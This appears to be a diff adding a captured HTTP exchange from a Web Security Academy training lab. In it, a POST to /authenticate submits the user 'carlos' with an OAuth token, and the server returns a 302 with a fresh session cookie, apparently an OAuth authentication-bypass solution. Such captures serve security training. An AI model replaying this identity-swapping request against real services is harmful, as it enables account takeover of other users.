@@ -1,0 +1,23 @@
+POST https://0a9600ad048751a88289a7c700630059.web-security-academy.net/authenticate HTTP/1.1
+host: 0a9600ad048751a88289a7c700630059.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+Referer: https://0a9600ad048751a88289a7c700630059.web-security-academy.net/oauth-callback
+Content-Type: application/json
+content-length: 111
+Origin: https://0a9600ad048751a88289a7c700630059.web-security-academy.net
+Connection: keep-alive
+Cookie: session=MjUiobAZzdjmYVzRsGR1JyGzugeqMmH7
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=4
+
+{"email":"carlos@carlos-montoya.net","username":"carlos","token":"O9jBofrNRKOihLvUdA2OViBY1vqzDH8zdJ0FFFQDmwp"}HTTP/1.1 302 Found
+Location: /
+Set-Cookie: session=LSUZujoHlmS1OOCoz4PVcnUuSygGmFJf; Secure; HttpOnly; SameSite=None
+X-Frame-Options: SAMEORIGIN
+Connection: close
+Content-Length: 0
+
